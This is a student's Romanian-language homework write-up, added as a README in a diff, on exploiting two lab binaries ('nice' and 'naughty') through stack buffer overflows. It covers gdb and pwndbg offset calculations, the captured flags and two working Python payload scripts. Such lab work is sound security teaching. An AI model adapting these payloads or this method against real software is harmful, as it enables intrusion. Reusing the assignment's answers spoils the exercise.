@@ -1,0 +1,363 @@
+# Iancu Alexandru-Gabriel 324CD
+
+-----------------------------------Task 1---------------------------------------
+
+Raspuns: print_flag 0x08049291 UPDATE 0x080492f5
+
+UPDATE -> Am observat ca de fapt poti sa consideri fiecare call se realizeaza
+asupra unei functii diferite. Desi au acelasi label, adresa, nr. de
+variabile si variabilele sunt diferite pt fiecare call asa ca pot fi
+considerate functii proprii. De asemenea la final de fiecare se afla un leave si
+un ret ca sa nu intru una peste cealalta. In cazul acesta, functia buclucasa e 
+cea care are acces la codul problematic. Si anume cea de la 
+0x080492f5 (print_flag+0x64).
+Asta e bucata de cod exploatabila, dar din alt punct de vedere, functiile care
+au lasat acest lucru sa se intample sunt cele care apeleaza read@plt fara sa
+aibe niste restrictii legate de dimensiunea intrarii si anume: 0x080492f5 de
+mai devreme si 0x080492de. Insa practica de la task-ul 2 mi-a aratat ca nu poti
+face buffer overflow pe primul read(de la functia 0x080492de) ca intra intr-un
+null pointer asa ca ramane doar functia 0x080492f5 problematica.
+
+Folosind objdump pe executabil cu optiunile -d(disassemble) si
+-M intel(pentru sintaxa Intel), am gasit functia main. In functia main
+sunt apeluri repetate de print_flag care are un nume reprezentativ pentru tema.
+M-am uitat sa caut si alte functii in caz de orice, dar restul sunt doar
+functii de baza si din biblioteci asa ca sigur in print_flag e problema.
+
+Cu experienta de la curs am cautat accesari de ebp pentru a gasi
+vulnerabilitatea. Am gasit o mutare de memorie din [ebp + 0x14] in eax asa
+ca cel mai probabil asta e slabiciunea, nefiind alte accesari ale ebp-ului sau
+vreo accesare a esp-ului. Instructiunea mov se afla la adresa 0x0804930d.
+
+Observ ca registrul eax e folosit pe linia urmatoare pentru un apel de functie. 
+Astfel daca as putea schimba primii 4 octeti de la ebp + 0x14, as 
+putea forta executabilul sa mearga intr-o parte din cod normal inaccesibila.
+
+Inainte de mov este apelata functia read@plt care am vazut folosind gdb ca
+citeste de la stdin un string. Astfel se regasesc toate bucatile de cod necesare 
+pentru a face un buffer overflow pentru disclose: citire din stdin a unui sir
+(cu read@plt), folosire a unei adrese stocate pe stiva pentru jump(call eax).
+
+-----------------------------------Task 2---------------------------------------
+
+Raspuns: NICE_FLAG{7afa183d877afd75059c95ec9cf63b26}
+
+Pentru acest task am creat un payload in python cu print. Pentru a calcula
+cat de mare trebuie sa am padding-ul in payload, pentru a ajunge la ebp+0x14,
+am rulat executabilul cu gdb. A trebuit sa stochez output-ul payload-ului
+intr-un fisier text auxiliar (nice_payload.txt) pentru a-l putea da ca
+intrare in gdb.
+
+./nice_payload > nice_payload.txt // pentru a stoca output-ul
+
+gdb ./nice
+start < nice_payload.txt // pentru a folosi nice_payload drept stdin la nice
+
+Din main functia apeleaza print_flag+77(0x080492de). In acest cod se afla un
+call read@plt(la adresa 0x080492ee) care imi citeste input-ul. Initial
+am incercat sa suprascriu cu buffer-ul de aici, dar gasea un null pointer(la
+adresa 0xffffcfc1) inainte de ajunge la adresa lui ebp+0x14 si se oprea.
+
+0xffffd050 <- ebp + 0x14
+0xffffcf90 <- unde este primul buffer pe stiva
+
+offset = 0xffffd050 - 0xffffcf90 = 192, pentru acest offset ar fi trebuit
+sa ajung fix in dreptul lui ebp+0x14, dar nu ajungea din cauza null pointer-ului
+
+Dupa ce se intoarce in main apeleaza print_flag+100(0x080492f5), aici se ajunge
+la bucata problematica din cod despre care am discutat la task-ul 1. Am observat
+prin numeroase incercari ca read@plt(de la 0x08049308) poate sa suprascrie
+ebp+0x14.
+
+// precizare: ebp + 0x14 s-a schimbat intre timp dintr-un motiv anume
+
+0xffffd04c <- ebp + 0x14
+0xffffcfb2 <- unde este al doilea buffer pe stiva
+
+0xffffd04c - 0xffffcfb2 = 154, nici pentru acest offset nu ajungea unde
+trebuia, dar nu se mai oprea la null pointer; pentru offset 1000 spre exemplu
+se suprascria, asa ca trebuie sa vad cat de mare e padding-ul pentru 154
+
+pwndbg> x/100x 0xffffcfb2
+0xffffcfb2:	0x43434343	0x43434343	0x43434343	0x43434343
+0xffffcfc2:	0x43434343	0x43434343	0x43434343	0x43434343
+0xffffcfd2:	0x43434343	0x43434343	0x43434343	0x43434343
+0xffffcfe2:	0x43434343	0x43434343	0x43434343	0x43434343
+0xffffcff2:	0x43434343	0x43434343	0x43434343	0x43434343
+0xffffd002:	0x43434343	0x43434343	0x43434343	0x43434343
+0xffffd012:	0x43434343	0x43434343	0x04929143	0x00010808
+0xffffd022:	0xd0e40000	0xd0ecffff	0x93bbffff	0x22f00804
+0xffffd032:	0x0000f7fe	0xd0480000	0x9366ffff	0x92c80804
+0xffffd042:	0xc0cc0804	0x00000804	0xeee50000	0x0001f7dd
+0xffffd052:	0xd0e40000	0xd0ecffff	0xd074ffff	0xb000ffff
+
+Dupa cum se observa nu ajunge la 0xffffd04c paddingul plin de 0x43("C").
+
+Sunt 6 linii pline de "C"-uri, adica 6*4*4 = 96 de 0x43-uri
+Si o linie aproape plina care are 2*4 + 1 = 9 0x43-uri
+Un total de 96+9 = 105 "C"-uri
+
+Asta inseamna ca pentru offset-ul de 158 am 105 de C-uri => 158-105 = 45 de
+"C"-uri diferenta
+
+Daca adaug cele 45 de "C"-uri lipsa la offset se ajunge la 158+45 = 203, pentru
+acest offset se umple cu 0x43-uri pana in fix 0xffffd050.
+
+Acum am nevoie doar de adresa functiei unde trebuie sa mearga. La inceput
+am cautat cu xxd NICE si corespondentul in hexa si n-am gasit nimic asa
+ca m-am decis sa aleg eu niste locuri posibile. In print_flag sunt 2 apelari
+de puts si m-am decis sa il setez fix inaintea lor ("\xbc\x92\x04\x08" - ex.),
+dar imi afisa ceva ciudat si imi dadea seg fault. Apoi m-am decis sa il pun
+in main la primul push de dinainte de fiecare apel de print_flag
+("\x7a\x93\x04\x08" spre ex.), dar imi dadea doar segfault fara sa afisez nimic.
+Si intr-un final m-am gandit ca de ce sa nu incerc si functia print_flag de
+la inceput adica de la 0x08049291. Si in mod amuzant era atat de simplu...
+
+L-am pus de 2 ori sa-l gasesti prin tot mormanul de scris:
+NICE_FLAG{7afa183d877afd75059c95ec9cf63b26}
+
+-----------------------------------Task 3---------------------------------------
+
+Raspuns:
+A) functia problematica: print_flag la 0x08049291
+UPDATE -> Sunt de fapt functii diferite si astfel mai multe problematice:
+-print_flag+0x4d (0x080492de) -> un compare ce foloseste ebp-0x162
+-print_flag+0x77(0x08049308) -> un compare ce foloseste ebp-0xb9
+-print_flag+0xa4(0x08049335) -> un compare ce foloseste ebp-0x19 si un call
+ce foloseste ebp+8
+-print_flag+0xda(0x0804936b) -> un compare ce foloseste ebp-0x1e7
+-print_flag+0x107(0x08049398) -> un compare ce foloseste ebp-0x54
+-print_flag+0x131(0x080493c2) -> un compare ce foloseste ebp-0x195
+-print_flag+0x15e(0x080493ef) -> un compare ce foloseste ebp-0xcc
+
+Toate sunt problematice pentru ca toate se folosesc in mod direct de stiva. Si
+pentru ca toate au un read@plt care nu e securizat contra buffer overflow.
+
+B) NAUGHTY_FLAG{65483d79299f45cbc4ed9f341d141b10}
+
+Zone vulnerabile sunt unde se fac comparatiile cu octeti de pe stiva:
+0x080492f3, 0x08049320, 0x0804934d, 0x08049383, 0x080493b0, 0x080493da,
+0x08049404. Fiecare dintre aceste comparatii au dupa un jump care actioneaza
+pe egalitate, asa ca presupun ca trebuie ca fiecare sa se activeze pentru
+a afisa flag-ul. De asemenea mai este un call ce folosesti o adresa de pe stiva 
+asemanator cu binarul nice(la adresa 0x08049360 asa ca presupun ca tot la 
+print_flag(0x08049291) vrea sa ajunga. UPDATE: vrea sa ajunga la leave+ret
+UPDATE_FINAL: la print_flag de fapt...
+
+******Comparatie 1******
+
+In main se apeleaza intai print_flag+77(0x080492b7) care ne duce la urmatoarea
+comparatie:
+
+cmp    dword ptr [ebp - 0x162], 0x2a0c09dc
+
+Inainte de comparatie este un apel de read@plt cu ajutorul caruia bufferul meu
+va putea suprascrie valori in stiva. Astfel ar trebui sa adaug o combinatie
+de padding si 0x2a0c09dc pentru a suprascrie primii patru octeti de la
+ebp - 0x162 cu 0x2a0c09dc.
+
+0xffffce89 <- adresa buffer-ului citit cu read@plt
+0xffffcec2 <- ebp - 0x162 (in caz ca n-am mentionat mai sus, aflu astfel
+de valori din stiva cu print-ul gdb-ului -> p/x ($ebp - 0x162))
+
+0xffffcec2 - 0xffffce89 = 57 => ca am nevoie de un padding de 57 de octeti
+urmat de octetii 0x2a0c09dc
+
+******Comparatie 2******
+
+Am testat si a mers, asa ca a sarit la un leave+ret in loc sa dea exit. S-a
+intors in main si din main s-a apelat print_flag+119(0x08049308). Se ajunge
+la alta comparatie:
+
+0xffffcf20 <- adresa buffer No. 2
+0xffffcf63 <- ebp - 0xb9
+0xf643e64f <- termenul comparatiei
+
+0xffffcf63 - 0xffffcf20 = 67
+
+Nu a citit nimic cu read@plt, asta inseamna ca nu am buffer-ul destul de mare. O
+sa incerc sa adaug diferenta fata de ebp - 0x162 de la prima comparatie.
+
+Vreau sa incep cu noul padding de dupa cei 4 octeti adaugati la ebp - 0x162 =>
+de la 0xffffcec2 + 4 = 0xffffcec6
+
+0xffffcf63 - 0xffffcec2 = 161 // diferenta teoretica intre buffer-ul 2 si
+                                           adresa unde am ramas la comparatia 11
+
+161 + 67 = 228 => ar trebui sa adaug un padding de 228 urmat de termenul
+comparatiei
+
+Se pare ca nu functioneaza asa... Am ajuns cu destul de multe padding dupa
+valoarea pe care trebuia sa o suprascriu:
+
+pwndbg> x/100x 0xffffcf63
+0xffffcf63:	0x43434343	0x43434343	0x43434343	0x43434343
+0xffffcf73:	0x43434343	0x43434343	0x43434343	0x43434343
+0xffffcf83:	0x43434343	0x43434343	0x43434343	0x43434343
+0xffffcf93:	0x43434343	0x43434343	0x43434343	0x43434343
+0xffffcfa3:	0x43434343	0x43434343	0x43434343	0x43434343
+0xffffcfb3:	0x43434343	0x43434343	0x43434343	0x43434343
+0xffffcfc3:	0x00434343	0xffd00000	0x000000f7	0x00000000
+
+Solutia care mi-a ramas este, asemanator cu task-ul 2, sa ma folosesc de
+aceasta noua informatie pentru a calcula un nou offset.
+
+6 linii pline de "C"-uri => 6 * 4 * 4 = 96 "C"-uri
+pe ultima linie au ramas 3 "C"-uri => in total 99 de "C"-uri
+
+228 - 99 = 129 0x43-uri
+
+Rezulta din nou niste padding in plus:
+
+pwndbg> x/100x 0xffffcf63
+0xffffcf63:	0x43434343	0x43434343	0x43434343	0x43434343
+0xffffcf73:	0x43434343	0x43434343	0x43434343	0x43434343
+0xffffcf83:	0x4f434343	0x04f643e6	0xffcffc08	0xffdaf0ff
+
+Motivul cel mai probabil este ca dupa padding-ul de mai sus urma un octet null
+care mai oprea din padding si nu puteam face o estimare corecta. Dupa ce mai
+scad padding-ul in plus de acum ar trebui sa fie ok.
+
+2 * 4 * 4 + 3 = 32 + 3 = 35 "C"-uri
+129 - 35 = 94 0x43-uri
+
+Dupa testare am aflat ca da bine si astfel ca 94 e padding-ul necesar pentru
+a doua comparatie
+
+******Comparatiile 3-7******
+
+Am observat ca se cam lungeste cu explicatiile daca o fac pentru fiecare
+comparatie asa ca o sa ma opresc la 2 pentru ca nu sunt mari diferente. La
+celelalte comparatii o sa fie analog metodei de trial & error pe care am
+folosit-o pentru comparatia a 2-a. O sa imi aleg niste numere fixate la inceput
+gen 100 sau ceva si vad de acolo cat sa mai scad sau sa adaug la padding.
+
+******Apel de functie******
+
+Dupa ce am rezolvat cu comparatia 3 ajung la apelul de functie care se face
+catre [ebp + 8]. Pentru comparatia 3 am suprascris la ebp - 0x19 cu termenul
+de comparatia si nu s-a mai citit nimic intre timp. Astfel pot sa adaug
+padding in continuare la citirea de dinainte de comparatie 3.
+
+o sa fie 0x19 + 0x8 = 33 padding inainte de a adauga adresa
+
+Asemenea cu celelalte call-uri din functie, ma gandesc ca ar trebui sa sara la 
+leave+ret, asa ca adresa ce va fi pusa la ebp + 8 este 0x08049369 si anume
+la 3 instructiuni de dupa call(0x08049360).
+
+pwndbg> x/100x 0xffffcf18 <- buffer-ul No.3
+0xffffcfe8:	0x6f434343	0x4350d6f5	0x43434343	0x43434343
+0xffffcff8:	0x43434343	0x43434343	0x43434343	0x43434343
+0xffffd008:	0x43434343	0x43434343	0x0804a4c3	0x08043751
+0xffffd018:	0x08048b00	0x08046eca	0x080492c8	0x08041ea4
+
+Se pare ca pune padding de la ebp + 8 pana la ebp + 12, locul in care ar
+trebui sa fie adresa. Si o adresa pe octetul urmator. Dupa observatia asta
+am decis sa scad cu 4 offset-ul => 33 - 4 = 29
+
+O problema pe care am observat-o e ca atunci cand da ret, are adresa de retur
+suprascrisa. Asa ca ar trebui sa restitui adresa de retur. Functia este apelata
+initial in main la adresa 0x0804945d, astfel ca intorcandu-se ar trebui sa fie
+la instructiunea imediat urmatoare si anume push-ul de la 0x0804945d.
+
+******Final******
+
+Dupa ce am facut toate comparatiile sa fie egale am observat ca iese din main si
+nu merge nicaieri. Mi-am dat seama ca eu trebuia sa ma duc la un puts sau ceva
+cu apelul modificat, nu la leave+ret. Am incercat sa-l pun inainte de un puts si
+imi dadea All good! Bye bye! sau ceva de genul, asa ca am zis sa mai caut.
+Apoi am incercat din nou pe print_flag la inceput adica 0x08049291 si mi-a
+dat flag-ul... (NAUGHTY_FLAG{65483d79299f45cbc4ed9f341d141b10}) 
+
+Am mai incercat faza cu print_flag, dar inainte nu mergea si acuma dintr-un
+anume motiv merge. Inainte eu pur si simplu mergeam la leave+ret ca sa ajung la
+urmatoarea comparatie. Faza e ca daca iese dupa call inseamna ca nu va ajunge la
+comparatiile care urmeaza. Daca comentez afisarile pentru comparatiile 4-7
+observ ca merge... Asta inseamna ca nu era nevoie neaparat sa-mi bat capul 
+cu toate comparatiile... Daca tot le-am facut, o sa le las in payload sa fie.
+
+Mai jos am codul in caz ca doresti sa te uiti pe el(optional).
+
+-----------------------------------COD------------------------------------------
+
+******NICE******
+
+import sys
+
+offset = 203
+padding = offset * b"C"
+
+# adresa lui print_flag
+new_call_address = b"\x91\x92\x04\x08"
+
+# pentru ca am python3 si diferenta bytes strings
+# a trebuit sa folosesc pachetul sys pentru a afisa hexa
+sys.stdout.buffer.write(padding + new_call_address)
+
+******NAUGHTY******
+
+import sys
+
+compare1 = 57 * b"C" + b"\xdc\x09\x0c\x2a"
+compare2 = 94 * b"C" + b"\x4f\xe6\x43\xf6"
+
+# tot trial & error si 3
+compare3 = 305 * b"C" + b"\x6f\xf5\xd6\x50"
+# call a iesit simplu ca a fost offset-ul fata de compare3
+# adresa pe care o apeleaza e print_flag+0
+call = 29 * b"C" + b"\x91\x92\x04\x08"#b"\x62\x94\x04\x08"
+
+# si compare4 a iesit simplu ca era 2 offset intre val pe stack
+# si inceputul bufferului si pentru ca n-au fost probleme la stdin
+compare4 = 2 * b"C" + b"\x0c\x15\x0b\xc4"
+# 30 e offset-ul dintre compare4 si compare6 (ambele sunt la 0xffffcdXX)
+compare6 = 30 * b"C" + b"\x82\x0b\x6c\x26"
+
+# compare5 n-a avut nicio logica la offset, l-am facut dupa ureche
+# (vorbind de 440)
+# am scazut 34 din cauza compare6-ului adaugat inainte de el (compare 5 e la 
+# 0xffffceXX)
+# am scazut 193 din cauza compare7-ului adaugat inainte de el
+compare5 = (440 - 34 - 193) * b"C" + b"\xfe\xc1\x50\x24"
+
+#go_to_puts = 446 * b"C" + b"\x
+
+# 189 e offset-ul fata de compare6
+compare7 = 189 * b"C" + b"\x54\xdb\xe1\x77" 
+
+sys.stdout.buffer.write(compare1 + compare2)
+# cum am afisat compare2 cu compare1, a trebuit sa afisez ceva
+# si la read@plt de dinainte de comparatia 2
+sys.stdout.buffer.write(b"A")
+
+# call e in aceeasi functie cu compare3 in care e doar un read@plt
+sys.stdout.buffer.write(compare3 + call)
+
+# read@plt de dinainte de compare6 se intalnea cu un null pointer care il bloca
+# asa ca l-am modificat de la citirea de dinainte de compare 4
+# am putut face asta pentru ca termenii erau vecini(0xffffcd05 si 0xffffcd27)
+# in acelasi mod am adaugat si compare7(motiv -> bufferele de dinainte ii
+# propulsau bufferul dupa termenul ce trebuia suprascris)
+sys.stdout.buffer.write(compare4 + compare6 + compare7)
+
+# compare 5 e dupa compare 6 (la 0xffffce80) - ma refer la termenul de 
+# suprascris
+sys.stdout.buffer.write(compare5)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
